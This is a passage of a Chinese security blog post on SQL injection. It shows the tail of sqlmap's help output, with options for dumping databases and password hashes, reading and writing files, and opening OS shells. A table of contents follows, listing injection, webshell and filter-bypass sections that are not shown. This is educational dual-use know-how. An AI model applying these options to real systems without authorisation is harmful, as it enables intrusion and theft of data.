from file</span><br><span class="line"></span><br><span class="line">  Fingerprint:</span><br><span class="line">    -f, --fingerprint   Perform an extensive DBMS version fingerprint</span><br><span class="line"></span><br><span class="line">  Enumeration:</span><br><span class="line">    These options can be used to enumerate the back-end database</span><br><span class="line">    management system information, structure and data contained <span class="keyword">in</span> the</span><br><span class="line">    tables</span><br><span class="line"></span><br><span class="line">    -a, --all           Retrieve everything</span><br><span class="line">    -b, --banner        Retrieve DBMS banner</span><br><span class="line">    --current-user      Retrieve DBMS current user</span><br><span class="line">    --current-db        Retrieve DBMS current database</span><br><span class="line">    --hostname          Retrieve DBMS server hostname</span><br><span class="line">    --is-dba            Detect <span class="keyword">if</span> the DBMS current user is DBA</span><br><span class="line">    --<span class="built_in">users</span>             Enumerate DBMS <span class="built_in">users</span></span><br><span class="line">    --passwords         Enumerate DBMS <span class="built_in">users</span> password hashes</span><br><span class="line">    --privileges        Enumerate DBMS <span class="built_in">users</span> privileges</span><br><span class="line">    --roles             Enumerate DBMS <span class="built_in">users</span> roles</span><br><span class="line">    --dbs               Enumerate DBMS databases</span><br><span class="line">    --tables            Enumerate DBMS database tables</span><br><span class="line">    --columns           Enumerate DBMS database table columns</span><br><span class="line">    --schema            Enumerate DBMS schema</span><br><span class="line">    --count             Retrieve number of entries <span class="keyword">for</span> table(s)</span><br><span class="line">    --dump              Dump DBMS database table entries</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries</span><br><span class="line">    --search            Search column(s), table(s) and/or database name(s)</span><br><span class="line">    --comments          Check <span class="keyword">for</span> DBMS comments during enumeration</span><br><span class="line">    --statements        Retrieve SQL statements being run on DBMS</span><br><span class="line">    -D DB               DBMS database to enumerate</span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate</span><br><span class="line">    -X EXCLUDE          DBMS database identifier(s) to not enumerate</span><br><span class="line">    -U USER             DBMS user to enumerate</span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span><br><span class="line">    --pivot-column=P..  Pivot column name</span><br><span class="line">    --<span class="built_in">where</span>=DUMPWHERE   Use WHERE condition <span class="keyword">while</span> table dumping</span><br><span class="line">    --start=LIMITSTART  First dump table entry to retrieve</span><br><span class="line">    --stop=LIMITSTOP    Last dump table entry to retrieve</span><br><span class="line">    --first=FIRSTCHAR   First query output word character to retrieve</span><br><span class="line">    --last=LASTCHAR     Last query output word character to retrieve</span><br><span class="line">    --sql-query=SQLQ..  SQL statement to be executed</span><br><span class="line">    --sql-shell         Prompt <span class="keyword">for</span> an interactive SQL shell</span><br><span class="line">    --sql-file=SQLFILE  Execute SQL statements from given file(s)</span><br><span class="line"></span><br><span class="line">  Brute force:</span><br><span class="line">    These options can be used to run brute force checks</span><br><span class="line"></span><br><span class="line">    --common-tables     Check existence of common tables</span><br><span class="line">    --common-columns    Check existence of common columns</span><br><span class="line">    --common-files      Check existence of common files</span><br><span class="line"></span><br><span class="line">  User-defined <span class="keyword">function</span> injection:</span><br><span class="line">    These options can be used to create custom user-defined <span class="built_in">functions</span></span><br><span class="line"></span><br><span class="line">    --udf-inject        Inject custom user-defined <span class="built_in">functions</span></span><br><span class="line">    --shared-lib=SHLIB  Local path of the shared library</span><br><span class="line"></span><br><span class="line">  File system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying file system</span><br><span class="line"></span><br><span class="line">    --file-read=FILE..  Read a file from the back-end DBMS file system</span><br><span class="line">    --file-write=FIL..  Write a <span class="built_in">local</span> file on the back-end DBMS file system</span><br><span class="line">    --file-dest=FILE..  Back-end DBMS absolute filepath to write to</span><br><span class="line"></span><br><span class="line">  Operating system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying operating system</span><br><span class="line"></span><br><span class="line">    --os-cmd=OSCMD      Execute an operating system <span class="built_in">command</span></span><br><span class="line">    --os-shell          Prompt <span class="keyword">for</span> an interactive operating system shell</span><br><span class="line">    --os-pwn            Prompt <span class="keyword">for</span> an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-smbrelay       One click prompt <span class="keyword">for</span> an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-bof            Stored procedure buffer overflow exploitation</span><br><span class="line">    --priv-esc          Database process user privilege escalation</span><br><span class="line">    --msf-path=MSFPATH  Local path <span class="built_in">where</span> Metasploit Framework is installed</span><br><span class="line">    --tmp-path=TMPPATH  Remote absolute path of temporary files directory</span><br><span class="line"></span><br><span class="line">  Windows registry access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system Windows registry</span><br><span class="line"></span><br><span class="line">    --reg-read          Read a Windows registry key value</span><br><span class="line">    --reg-add           Write a Windows registry key value data</span><br><span class="line">    --reg-del           Delete a Windows registry key value</span><br><span class="line">    --reg-key=REGKEY    Windows registry key</span><br><span class="line">    --reg-value=REGVAL  Windows registry key value</span><br><span class="line">    --reg-data=REGDATA  Windows registry key value data</span><br><span class="line">    --reg-type=REGTYPE  Windows registry key value <span class="built_in">type</span></span><br><span class="line"></span><br><span class="line">  General:</span><br><span class="line">    These options can be used to <span class="built_in">set</span> some general working parameters</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      Load session from a stored (.sqlite) file</span><br><span class="line">    -t TRAFFICFILE      Log all HTTP traffic into a textual file</span><br><span class="line">    --answers=ANSWERS   Set predefined answers (e.g. <span class="string">&quot;quit=N,follow=N&quot;</span>)</span><br><span class="line">    --<span class="built_in">base64</span>=BASE64P..  Parameter(s) containing Base64 encoded data</span><br><span class="line">    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)</span><br><span class="line">    --batch             Never ask <span class="keyword">for</span> user input, use the default behavior</span><br><span class="line">    --binary-fields=..  Result fields having binary values (e.g. <span class="string">&quot;digest&quot;</span>)</span><br><span class="line">    --check-internet    Check Internet connection before assessing the target</span><br><span class="line">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables</span><br><span class="line">    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL</span><br><span class="line">    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. <span class="string">&quot;logout&quot;</span>)</span><br><span class="line">    --csv-del=CSVDEL    Delimiting character used <span class="keyword">in</span> CSV output (default <span class="string">&quot;,&quot;</span>)</span><br><span class="line">    --charset=CHARSET   Blind SQL injection charset (e.g. <span class="string">&quot;0123456789abcdef&quot;</span>)</span><br><span class="line">    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)</span><br><span class="line">    --encoding=ENCOD..  Character encoding used <span class="keyword">for</span> data retrieval (e.g. GBK)</span><br><span class="line">    --eta               Display <span class="keyword">for</span> each output the estimated time of arrival</span><br><span class="line">    --flush-session     Flush session files <span class="keyword">for</span> current target</span><br><span class="line">    --forms             Parse and <span class="built_in">test</span> forms on target URL</span><br><span class="line">    --fresh-queries     Ignore query results stored <span class="keyword">in</span> session file</span><br><span class="line">    --gpage=GOOGLEPAGE  Use Google dork results from specified page number</span><br><span class="line">    --har=HARFILE       Log all HTTP traffic into a HAR file</span><br><span class="line">    --hex               Use hex conversion during data retrieval</span><br><span class="line">    --output-dir=OUT..  Custom output directory path</span><br><span class="line">    --parse-errors      Parse and display DBMS error messages from responses</span><br><span class="line">    --preprocess=PRE..  Use given script(s) <span class="keyword">for</span> preprocessing (request)</span><br><span class="line">    --postprocess=PO..  Use given script(s) <span class="keyword">for</span> postprocessing (response)</span><br><span class="line">    --repair            Redump entries having unknown character marker (?)</span><br><span class="line">    --save=SAVECONFIG   Save options to a configuration INI file</span><br><span class="line">    --scope=SCOPE       Regexp <span class="keyword">for</span> filtering targets</span><br><span class="line">    --skip-heuristics   Skip heuristic detection of vulnerabilities</span><br><span class="line">    --skip-waf          Skip heuristic detection of WAF/IPS protection</span><br><span class="line">    --table-prefix=T..  Prefix used <span class="keyword">for</span> temporary tables (default: <span class="string">&quot;sqlmap&quot;</span>)</span><br><span class="line">    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)</span><br><span class="line">    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)</span><br><span class="line">    --web-root=WEBROOT  Web server document root directory (e.g. <span class="string">&quot;/var/www&quot;</span>)</span><br><span class="line"></span><br><span class="line">  Miscellaneous:</span><br><span class="line">    These options <span class="keyword">do</span> not fit into any other category</span><br><span class="line"></span><br><span class="line">    -z MNEMONICS        Use short mnemonics (e.g. <span class="string">&quot;flu,bat,ban,tec=EU&quot;</span>)</span><br><span class="line">    --alert=ALERT       Run host OS <span class="built_in">command</span>(s) when SQL injection is found</span><br><span class="line">    --beep              Beep on question and/or when vulnerability is found</span><br><span class="line">    --dependencies      Check <span class="keyword">for</span> missing (optional) sqlmap dependencies</span><br><span class="line">    --disable-coloring  Disable console output coloring</span><br><span class="line">    --list-tampers      Display list of available tamper scripts</span><br><span class="line">    --no-logging        Disable logging to a file</span><br><span class="line">    --offline           Work <span class="keyword">in</span> offline mode (only use session data)</span><br><span class="line">    --purge             Safely remove all content from sqlmap data directory</span><br><span class="line">    --results-file=R..  Location of CSV results file <span class="keyword">in</span> multiple targets mode</span><br><span class="line">    --shell             Prompt <span class="keyword">for</span> an interactive sqlmap shell</span><br><span class="line">    --tmp-dir=TMPDIR    Local directory <span class="keyword">for</span> storing temporary files</span><br><span class="line">    --unstable          Adjust options <span class="keyword">for</span> unstable connections</span><br><span class="line">    --update            Update sqlmap</span><br><span class="line">    --wizard            Simple wizard interface <span class="keyword">for</span> beginner <span class="built_in">users</span></span><br></pre></td></tr></table></figure>























</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qeminco.github.io">Qeminco</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qeminco.github.io/2022/12/28/SQL%E6%B3%A8%E5%85%A5/">https://qeminco.github.io/2022/12/28/SQL注入/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://qeminco.github.io" target="_blank">Qeminco'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></div><div class="post_share"></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/05/16/XXE/" title="XXE"><img class="cover" src="/img/26.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-16</div><div class="title">XXE</div></div></a></div><div><a href="/2022/05/28/xss%E6%BC%8F%E6%B4%9E/" title="XSS"><img class="cover" src="/img/56.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-28</div><div class="title">XSS</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/kunkun.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qeminco</div><div class="author-info__description">学习如逆水行舟，不进则退。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">生活明朗，万物可爱。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">SQL注入原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%88%E5%8F%A4%E8%80%81%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">万能密码（古老漏洞）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">4.</span> <span class="toc-text">一些关键字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">5.</span> <span class="toc-text">SQL语句注释符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">6.</span> <span class="toc-text">注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">7.</span> <span class="toc-text">注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E5%92%8C%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.1.</span> <span class="toc-text">1 判断否存在注入和类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">7.2.</span> <span class="toc-text">2 判断字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">7.3.</span> <span class="toc-text">3 显示字段信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9F%A5%E5%BA%93%E5%90%8D"><span class="toc-number">7.4.</span> <span class="toc-text">4 查库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="toc-number">7.5.</span> <span class="toc-text">5 查表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">7.6.</span> <span class="toc-text">6 查字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%9F%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">7.7.</span> <span class="toc-text">7 查用户名和密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">get注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">post注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-union-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">1 union 联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">2 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6"><span class="toc-number">11.0.1.</span> <span class="toc-text">判断字符长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%97%E6%AF%8D"><span class="toc-number">11.0.2.</span> <span class="toc-text">判断字符的字母</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%97%E6%9C%88"><span class="toc-number">11.0.3.</span> <span class="toc-text">暗月</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if-%E5%87%BD%E6%95%B0"><span class="toc-number">11.0.3.1.</span> <span class="toc-text">if()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substring"><span class="toc-number">11.0.3.2.</span> <span class="toc-text">substring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length"><span class="toc-number">11.0.3.3.</span> <span class="toc-text">length()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#burpsuite"><span class="toc-number">11.0.3.4.</span> <span class="toc-text">burpsuite</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">3 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XPath%E8%AF%AD%E6%B3%95%E6%8A%A5%E9%94%99"><span class="toc-number">12.1.</span> <span class="toc-text">XPath语法报错</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0"><span class="toc-number">12.1.1.</span> <span class="toc-text">extractvalue函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">12.1.2.</span> <span class="toc-text">updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">12.1.2.1.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">12.1.2.2.</span> <span class="toc-text">获取字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="toc-number">12.1.2.3.</span> <span class="toc-text">获取用户名密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">12.2.</span> <span class="toc-text">利用主键重复报错进行注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-1"><span class="toc-number">12.2.1.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5-1"><span class="toc-number">12.2.2.</span> <span class="toc-text">获取字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">12.2.3.</span> <span class="toc-text">获取账号密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">13.</span> <span class="toc-text">4 时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">5 cookie注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-User-Agent%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">6 User-Agent注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-dnslog-%E6%8A%8A%E7%9B%B2%E6%B3%A8%E5%8F%98%E6%98%BE%E6%B3%A8"><span class="toc-number">16.</span> <span class="toc-text">7 dnslog:把盲注变显注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">17.</span> <span class="toc-text">8 二阶注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">9 宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">19.</span> <span class="toc-text">10 堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">20.</span> <span class="toc-text">11 利用SQL注入读取与写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11-1%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">20.1.</span> <span class="toc-text">11.1利用SQL注入读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-2-%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">20.2.</span> <span class="toc-text">11.2 利用SQL注入写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2-1-%E5%B0%86%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">20.2.1.</span> <span class="toc-text">11.2.1 将数据库查询结果写入文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2-2-%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">20.2.2.</span> <span class="toc-text">11.2.2 写入一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2-3-%E5%88%A9%E7%94%A8sqlmap%E8%8E%B7%E5%BE%97shell%E6%9D%83%E9%99%90"><span class="toc-number">20.2.3.</span> <span class="toc-text">11.2.3 利用sqlmap获得shell权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-sql%E9%98%B2%E5%BE%A1"><span class="toc-number">21.</span> <span class="toc-text">12 sql防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4"><span class="toc-number">21.0.1.</span> <span class="toc-text">1 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BD%AC%E4%B9%89"><span class="toc-number">21.0.2.</span> <span class="toc-text">2 转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2"><span class="toc-number">21.0.3.</span> <span class="toc-text">3 参数化查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8"><span class="toc-number">21.0.4.</span> <span class="toc-text">4 加密存储</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%99%90%E5%88%B6%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E5%92%8C%E7%89%B9%E6%9D%83"><span class="toc-number">21.0.5.</span> <span class="toc-text">5 限制数据库权限和特权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="toc-number">22.</span> <span class="toc-text">13 SQL注入绕过网站防御机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82"><span class="toc-number">22.1.</span> <span class="toc-text">1. SQL注入的一些细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">22.1.1.</span> <span class="toc-text">1.1 可能存在SQL注入的功能点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E9%97%AD%E5%90%88"><span class="toc-number">22.1.2.</span> <span class="toc-text">1.2 闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%B5%8B%E8%AF%95%E5%88%97%E6%95%B0"><span class="toc-number">22.1.3.</span> <span class="toc-text">1.3 测试列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E6%8E%A2%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8C%87%E7%BA%B9"><span class="toc-number">22.1.4.</span> <span class="toc-text">1.4 探测数据库指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E5%90%84%E7%B1%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">22.1.5.</span> <span class="toc-text">1.5 各类数据库注入语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-1-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">22.1.5.1.</span> <span class="toc-text">1.5.1 MySQL数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-2-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">22.1.5.2.</span> <span class="toc-text">1.5.2 Oracle数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-3-MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">22.1.5.3.</span> <span class="toc-text">1.5.3 MSSQL数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-4-PostgreSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">22.1.5.4.</span> <span class="toc-text">1.5.4 PostgreSQL数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E6%80%9D%E8%B7%AF"><span class="toc-number">22.2.</span> <span class="toc-text">2.绕过网站防御机制思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">22.2.1.</span> <span class="toc-text">2.1 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">22.2.2.</span> <span class="toc-text">2.2 双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">22.2.3.</span> <span class="toc-text">2.3 编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-URL%E7%BC%96%E7%A0%81"><span class="toc-number">22.2.3.1.</span> <span class="toc-text">2.3.1 URL编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">22.2.3.2.</span> <span class="toc-text">2.3.2 十六进制编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-char-%E5%87%BD%E6%95%B0"><span class="toc-number">22.2.3.3.</span> <span class="toc-text">2.3.3 char()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">22.2.4.</span> <span class="toc-text">2.4 注释绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87%E9%92%88%E5%AF%B9%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">22.2.4.1.</span> <span class="toc-text">2.4.1 注释绕过针对空格的过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5"><span class="toc-number">22.2.4.2.</span> <span class="toc-text">2.4.2 内联注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 